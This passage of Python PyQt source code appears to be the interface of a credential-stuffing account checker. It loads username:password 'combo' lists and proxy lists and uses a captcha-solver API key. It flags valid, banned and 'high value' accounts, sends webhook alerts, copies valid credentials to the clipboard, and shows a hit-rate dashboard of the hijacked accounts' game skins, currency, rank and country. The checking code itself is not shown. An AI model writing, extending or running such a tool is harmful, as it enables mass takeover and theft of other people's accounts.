        save_btn = QPushButton("Save Settings")
        save_btn.setStyleSheet("""
            QPushButton {
                background-color: #00AA00;
                color: white;
                font-weight: bold;
                padding: 10px 20px;
                border-radius: 5px;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #00CC00;
            }
            QPushButton:pressed {
                background-color: #008800;
            }
        """)
        save_btn.clicked.connect(lambda: self._save_settings_dialog(
            dialog, webhook_enabled, webhook_url_input, webhook_username_input,
            webhook_on_valid, webhook_on_banned, webhook_on_high_value, api_key_input_dialog,
            show_json_checkbox
        ))
        button_layout.addWidget(save_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background-color: #AA0000;
                color: white;
                font-weight: bold;
                padding: 10px 20px;
                border-radius: 5px;
                min-width: 120px;
            }
            QPushButton:hover {
                background-color: #CC0000;
            }
            QPushButton:pressed {
                background-color: #880000;
            }
        """)
        cancel_btn.clicked.connect(dialog.close)
        button_layout.addWidget(cancel_btn)
        
        layout.addLayout(button_layout)
        dialog.exec_()
    
    def _save_settings_dialog(self, dialog, webhook_enabled, webhook_url, webhook_username,
                              webhook_on_valid, webhook_on_banned, webhook_on_high_value, api_key_input,
                              show_json_checkbox):
        """Save settings from dialog"""
        global WEBHOOK_CONFIG, SETTINGS
        try:
            # Update webhook config
            WEBHOOK_CONFIG['enabled'] = webhook_enabled.isChecked()
            WEBHOOK_CONFIG['url'] = webhook_url.text().strip()
            WEBHOOK_CONFIG['username'] = webhook_username.text().strip()
            WEBHOOK_CONFIG['on_valid'] = webhook_on_valid.isChecked()
            WEBHOOK_CONFIG['on_banned'] = webhook_on_banned.isChecked()
            WEBHOOK_CONFIG['on_high_value'] = webhook_on_high_value.isChecked()
            
            # Update API key
            api_key = api_key_input.text().strip()
            if api_key:
                _SOLVER.api_key = api_key
                self.api_key_input.setText(api_key)
            
            # Update misc settings
            SETTINGS['show_json_in_full_capture'] = show_json_checkbox.isChecked()
            
            # Save to config file
            if save_config():
                _LOGGER.log("Settings saved successfully", "INFO")
                QMessageBox.information(self, "Settings", "Settings saved successfully!")
                dialog.close()
            else:
                QMessageBox.warning(self, "Settings", "Failed to save settings")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error saving settings: {e}")
    
    def _refresh_table_optimized(self):
        """Optimized table refresh using model/view architecture - handles unlimited rows efficiently"""
        try:
            # Get all combos from storage
            all_combos = self._storage.get_all_combos()
            status_sel = self.status_filter.currentText()
            query = self.search_box.text().strip()
            
            # Update model - it handles filtering internally and uses virtual scrolling
            # No need for display limits - QTableView only renders visible rows!
            self.table_model.update_data(all_combos, status_sel, query)
            
            # Maintain sort order (Rank column ascending - rank 1 = best at top, rank 3000 = worst at bottom)
            self.table.sortByColumn(8, Qt.AscendingOrder)
            
            # No more 200-500 row limits - can handle 10,000+ rows smoothly!
            
        except Exception as e:
            # Prevent crashes from table refresh errors
            _LOGGER.log(f"Error refreshing table: {e}", "ERROR")

    def on_load_proxies_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select proxies file", "", "Text files (*.txt);;All files (*.*)")
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                self.proxies_text.setPlainText(f.read())
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load proxies:\n{e}")

    def load_proxies_from_text(self):
        try:
            text = self.proxies_text.toPlainText().strip()
            if not text:
                return
            lines = [l.strip() for l in text.splitlines() if l.strip()]
            count = _PROXIES.load_proxies(lines)
            QMessageBox.information(self, "Proxies", f"Loaded {count} proxies.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to parse proxies:\n{e}")

    def on_single_check(self):
        username = self.single_user.text().strip()
        password = self.single_pass.text().strip()
        if not username or not password:
            QMessageBox.warning(self, "Single Check", "Please enter username and password.")
            return
        added, added_combos = self._storage.add_combos([(username, password)])
        if added == 0:
            combo_id: Optional[int] = None
            for c in self._storage.get_all_combos():
                if c['username'] == username and c['password'] == password:
                    combo_id = c['id']
                    break
        else:
            combo_id = added_combos[0]['id']
        def _run():
            try:
                self._checker.check_single_by_id(combo_id, username, password)
            except Exception:
                pass
        threading.Thread(target=_run, daemon=True).start()

    def on_select_all(self):
        self.table.selectAll()

    def on_clear_results(self):
        # Reset results but keep combos list; mark all as pending
        for c in list(self._storage.get_all_combos()):
            pass  # UI-only action; user can clear via restarting/new session
        QMessageBox.information(self, "Results", "Use export to save and restart app to clear.")

    def on_copy_results(self):
        combos = self._storage.get_all_combos()
        lines = [f"{c.get('username','')}:{c.get('password','')}" for c in combos if c.get('status') == 'valid']
        QApplication.clipboard().setText("\n".join(lines))
        QMessageBox.information(self, "Copied", "Valid combos copied to clipboard.")

    def on_filter_changed(self):
        self.refresh()
    
    
    def _show_table_context_menu(self, position):
        """Show context menu on right-click for QTableView"""
        index = self.table.indexAt(position)
        if not index.isValid():
            return
        
        # Get the row from proxy model and convert to source model row
        proxy_row = index.row()
        source_index = self.proxy_model.mapToSource(index)
        source_row = source_index.row()
        
        # Get combo data from model
        combo = self.table_model.get_combo_at(source_row)
        if not combo:
            return
        
        # Only show menu for valid accounts
        if combo.get('status') != 'valid':
            return
        
        menu = QMenu(self)
        action_view_details = QAction("View Account Details", self)
        action_view_details.triggered.connect(lambda: self._show_account_details_dialog(combo))
        menu.addAction(action_view_details)
        
        # Add skin list option if account has skins
        if combo.get('weapon_skins_count', 0) > 0 or combo.get('skins', 0) > 0:
            action_skin_list = QAction("View Skin List", self)
            action_skin_list.triggered.connect(lambda: self._show_skin_list_dialog(combo.get('username', 'Unknown'), combo))
            menu.addAction(action_skin_list)
        
        menu.exec_(self.table.viewport().mapToGlobal(position))
    
    def _show_account_details_dialog(self, combo_data):
        """Show full account details in a dialog with tabs"""
        username = combo_data.get('username', 'Unknown')
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Account Details - {username}")
        dialog.setGeometry(200, 200, 1200, 800)
        dialog.setStyleSheet(self.styleSheet())
        
        layout = QVBoxLayout()
        dialog.setLayout(layout)
        
        title_label = QLabel(f"Account Details: {username}")
        title_label.setFont(QFont("Arial", 14, QFont.Bold))
        layout.addWidget(title_label)
        
        tab_widget = QTabWidget()
        
        # Account Info Tab (reuse existing method)
        tab_widget.addTab(self._create_account_info_tab(combo_data), "Account Info")
        
        # Skins tabs if available
        skin_details = combo_data.get('skin_details', [])
        weapon_skins = combo_data.get('weapon_skins', [])
        if skin_details or weapon_skins:
            if skin_details:
                tab_widget.addTab(self._create_skins_tab(skin_details), f"Equipped Skins ({len(skin_details)})")
            if weapon_skins:
                tab_widget.addTab(self._create_skins_tab(weapon_skins), f"All Skins ({len(weapon_skins)})")
        
        layout.addWidget(tab_widget)
        
        button_layout = QHBoxLayout()
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.close)
        button_layout.addWidget(close_btn)
        layout.addLayout(button_layout)
        
        dialog.exec_()
    
    def on_show_statistics(self):
        """Show statistics dashboard dialog"""
        dialog = QDialog(self)
        dialog.setWindowTitle("Statistics Dashboard")
        dialog.setGeometry(200, 200, 1000, 700)
        dialog.setStyleSheet(self.styleSheet())
        
        layout = QVBoxLayout()
        dialog.setLayout(layout)
        
        title_label = QLabel("Statistics Dashboard")
        title_label.setFont(QFont("Arial", 16, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        
        # Create statistics tab
        stats_widget = self._create_statistics_tab()
        layout.addWidget(stats_widget)
        
        button_layout = QHBoxLayout()
        refresh_btn = QPushButton("Refresh Statistics")
        refresh_btn.clicked.connect(lambda: self._refresh_statistics_tab(stats_widget))
        button_layout.addWidget(refresh_btn)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.close)
        button_layout.addWidget(close_btn)
        layout.addLayout(button_layout)
        
        dialog.exec_()
    
    def _create_statistics_tab(self):
        """Create statistics tab widget with all statistics"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        
        # Calculate statistics
        stats = self._calculate_statistics()
        
        # Hit Rate Card
        hit_rate_group = QGroupBox("Hit Rate")
        hit_rate_layout = QVBoxLayout()
        hit_rate_label = QLabel(f"{stats['hit_rate']:.2f}%")
        hit_rate_label.setFont(QFont("Arial", 24, QFont.Bold))
        hit_rate_label.setAlignment(Qt.AlignCenter)
        hit_rate_layout.addWidget(hit_rate_label)
        hit_rate_sub = QLabel(f"Valid: {stats['valid']} / Checked: {stats['checked']}")
        hit_rate_sub.setAlignment(Qt.AlignCenter)
        hit_rate_layout.addWidget(hit_rate_sub)
        hit_rate_group.setLayout(hit_rate_layout)
        layout.addWidget(hit_rate_group)
        
        # Averages Card
        averages_group = QGroupBox("Averages (Valid Accounts)")
        averages_layout = QGridLayout()
        averages_layout.addWidget(QLabel("Average Level:"), 0, 0)
        averages_layout.addWidget(QLabel(f"{stats['avg_level']:.1f}"), 0, 1)
        averages_layout.addWidget(QLabel("Average VP:"), 1, 0)
        averages_layout.addWidget(QLabel(f"{stats['avg_vp']:.0f}"), 1, 1)
        averages_layout.addWidget(QLabel("Average RD:"), 2, 0)
        averages_layout.addWidget(QLabel(f"{stats['avg_rd']:.0f}"), 2, 1)
        averages_layout.addWidget(QLabel("Average Skins:"), 3, 0)
        averages_layout.addWidget(QLabel(f"{stats['avg_skins']:.1f}"), 3, 1)
        averages_group.setLayout(averages_layout)
        layout.addWidget(averages_group)
        
        # Top Countries
        top_countries_group = QGroupBox("Top 10 Countries")
        top_countries_layout = QVBoxLayout()
        if stats['top_countries']:
            for country, count in stats['top_countries']:
                country_row = QHBoxLayout()
                country_row.addWidget(QLabel(f"{country}:"))
                country_row.addStretch()
                country_row.addWidget(QLabel(str(count)))
                top_countries_layout.addLayout(country_row)
        else:
            top_countries_layout.addWidget(QLabel("No country data available"))
        top_countries_group.setLayout(top_countries_layout)
        layout.addWidget(top_countries_group)
        
        # Rank Distribution
        rank_dist_group = QGroupBox("Rank Distribution")
        rank_dist_layout = QVBoxLayout()
        rank_dist_text = QTextEdit()
        rank_dist_text.setReadOnly(True)
        rank_dist_text.setMaximumHeight(200)
        rank_lines = []
        for rank_range, count in stats['rank_distribution']:
            bar = "█" * min(count, 50)  # Limit bar length
            rank_lines.append(f"{rank_range}: {bar} ({count})")
        rank_dist_text.setText('\n'.join(rank_lines))
        rank_dist_layout.addWidget(rank_dist_text)
        rank_dist_group.setLayout(rank_dist_layout)
        layout.addWidget(rank_dist_group)
        
        # Total Skins
        total_skins_group = QGroupBox("Total Cosmetics")
        total_skins_layout = QVBoxLayout()
        total_skins_label = QLabel(f"Total Skins: {stats['total_skins']}")
        total_skins_label.setFont(QFont("Arial", 14, QFont.Bold))
        total_skins_label.setAlignment(Qt.AlignCenter)
        total_skins_layout.addWidget(total_skins_label)
        total_skins_group.setLayout(total_skins_layout)
        layout.addWidget(total_skins_group)
        
        layout.addStretch()
        return widget
    
    def _calculate_statistics(self):
        """Calculate statistics from all combos"""
        all_combos = self._storage.get_all_combos()
        valid_combos = [c for c in all_combos if c.get('status') == 'valid']
        
        stats = {
            'checked': 0,
            'valid': 0,
            'hit_rate': 0.0,
            'avg_level': 0.0,
            'avg_vp': 0.0,
            'avg_rd': 0.0,
            'avg_skins': 0.0,
            'top_countries': [],
            'rank_distribution': [],
            'total_skins': 0
        }
        
        # Basic counts
        stats['checked'] = len([c for c in all_combos if c.get('status') in ['valid', 'invalid']])
        stats['valid'] = len(valid_combos)
        
        # Hit rate
        if stats['checked'] > 0:
            stats['hit_rate'] = (stats['valid'] / stats['checked']) * 100
        
        if not valid_combos:
            return stats
        
        # Averages
        levels = []
        vps = []
        rds = []
        skins_counts = []
        countries = {}
        rank_ranges = {
            '1-100': 0,
            '101-500': 0,
            '501-1000': 0,
            '1001-2000': 0,
            '2001-3000': 0,
            'Unranked': 0
        }
        
        for combo in valid_combos:
            # Level
            level = combo.get('level', 0)
            try:
                level = int(level) if level else 0
                levels.append(level)
            except (ValueError, TypeError):
                pass
            
            # VP
            vp = combo.get('vp', 0)
            try:
                vp = int(vp) if vp else 0
                vps.append(vp)
            except (ValueError, TypeError):
                pass
            
            # RD
            rd = combo.get('rd', 0)
            try:
                rd = int(rd) if rd else 0
                rds.append(rd)
            except (ValueError, TypeError):
                pass
            
            # Skins
            skins_count = combo.get('weapon_skins_count', 0) or combo.get('skins', 0)
            try:
                skins_count = int(skins_count) if skins_count else 0
                skins_counts.append(skins_count)
                stats['total_skins'] += skins_count
            except (ValueError, TypeError):
                pass
            
            # Country
            country = combo.get('country', '')
            if country:
                countries[country] = countries.get(country, 0) + 1
            
            # Rank distribution
            rank_str = str(combo.get('rank', ''))
            rank_val = _extract_rank_value(rank_str)
            if rank_val == 0:
                rank_ranges['Unranked'] += 1
            elif 1 <= rank_val <= 100:
                rank_ranges['1-100'] += 1
            elif 101 <= rank_val <= 500:
                rank_ranges['101-500'] += 1
            elif 501 <= rank_val <= 1000:
                rank_ranges['501-1000'] += 1
            elif 1001 <= rank_val <= 2000:
                rank_ranges['1001-2000'] += 1
            elif 2001 <= rank_val <= 3000:
                rank_ranges['2001-3000'] += 1
        
        # Calculate averages
        if levels:
            stats['avg_level'] = sum(levels) / len(levels)
        if vps:
            stats['avg_vp'] = sum(vps) / len(vps)
        if rds:
            stats['avg_rd'] = sum(rds) / len(rds)
        if skins_counts:
            stats['avg_skins'] = sum(skins_counts) / len(skins_counts)
        
        # Top countries
        sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)
        stats['top_countries'] = sorted_countries[:10]
        
        # Rank distribution
        stats['rank_distribution'] = [
            ('1-100', rank_ranges['1-100']),
            ('101-500', rank_ranges['101-500']),
            ('501-1000', rank_ranges['501-1000']),
            ('1001-2000', rank_ranges['1001-2000']),
            ('2001-3000', rank_ranges['2001-3000']),
            ('Unranked', rank_ranges['Unranked'])
        ]
        
        return stats
    
    def _refresh_statistics_tab(self, widget):
        """Refresh statistics tab content"""
        # Remove old widget and create new one
        parent = widget.parent()
        if parent:
            layout = parent.layout()
            if layout:
                layout.removeWidget(widget)
                widget.deleteLater()
                new_widget = self._create_statistics_tab()
                layout.insertWidget(0, new_widget)


if __name__ == "__main__":
    main()
